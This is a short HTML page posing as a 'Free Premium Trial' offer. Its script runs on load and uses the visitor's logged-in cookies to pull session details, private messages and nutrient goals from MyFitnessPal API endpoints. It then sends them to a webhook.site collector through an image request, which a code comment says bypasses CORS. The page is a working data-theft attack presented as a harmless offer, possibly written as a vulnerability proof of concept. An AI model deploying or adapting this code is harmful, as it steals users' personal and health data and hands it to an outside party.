<!DOCTYPE html>
<html>
<head><title>Free Premium Trial</title></head>
<body>
<h2>Claiming your free trial...</h2>
<div id="log"></div>
<script>
const exfil = "https://webhook.site/f944539a-15e8-4640-855a-a2079b0ac5c1";
const log = document.getElementById("log");

function addLog(msg) {
  log.innerHTML += "<p>" + msg + "</p>";
}

async function steal() {
  try {
    const session = await fetch("https://www.myfitnesspal.com/api/auth/session", {credentials:"include"}).then(r=>r.json());
    addLog("Session: " + JSON.stringify(session));

    const messages = await fetch("https://www.myfitnesspal.com/api/services/messages", {credentials:"include"}).then(r=>r.json());
    addLog("Messages: " + JSON.stringify(messages));

    const goals = await fetch("https://www.myfitnesspal.com/api/services/nutrient-goals", {credentials:"include"}).then(r=>r.json());

    // Send via image src - bypasses CORS entirely
    const data = encodeURIComponent(JSON.stringify({
      email: session.email,
      userId: session.userId,
      tier: session.currentTier,
      messages: messages,
      goals: goals
    }));

    new Image().src = exfil + "?data=" + data;
    addLog("Sent via GET!");

  } catch(e) {
    addLog("Error: " + e.message);
  }
}

steal();
</script>
</body>
</html>
